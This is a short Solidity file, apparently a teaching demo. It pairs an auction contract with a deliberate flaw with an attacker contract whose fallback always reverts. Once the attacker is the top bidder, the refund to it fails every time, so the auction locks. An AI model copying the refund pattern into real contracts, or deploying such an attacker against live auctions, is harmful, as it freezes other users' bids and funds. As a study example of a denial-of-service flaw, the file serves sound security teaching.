// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

contract  VictimContract{
    uint256 public winnerBid;
    address payable highestBidder;
    
    function userBid() external payable {
        require(msg.value > winnerBid);
        
        require(highestBidder.send(winnerBid));
        highestBidder = payable(msg.sender);
        winnerBid = msg.value;
    }
    function getoWner() external view returns (address) {
        return highestBidder;
    }
}

contract AttackerContract{
    VictimContract victimContract;
    constructor(VictimContract _victimContract) {
        victimContract = _victimContract;
    }
    
    fallback() external payable {
        revert();
    }
    
    function Bid() external payable {
        require(msg.value > victimContract.winnerBid());
        victimContract.userBid{value: msg.value}();
    }
}